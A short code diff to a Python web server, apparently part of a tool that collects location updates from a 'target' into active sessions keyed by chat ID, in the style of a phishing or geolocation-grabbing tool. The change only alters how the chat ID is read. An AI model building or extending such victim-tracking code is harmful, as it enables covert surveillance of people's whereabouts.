@@ -140,8 +140,7 @@ def get_website():
 def update_location():
     """Handles location updates from the target"""
     data = request.json or {}
-    chat_id = request.args.get('id', '')
-    
+    chat_id = request.args.get('id', '') or (request.json and request.json.get('chat_id', ''))
     print(f"{G}[+] {C}UPDATE_LOCATION_CALLED chat_id={chat_id} data={data}{W}")
 
     if chat_id and chat_id in active_sessions:
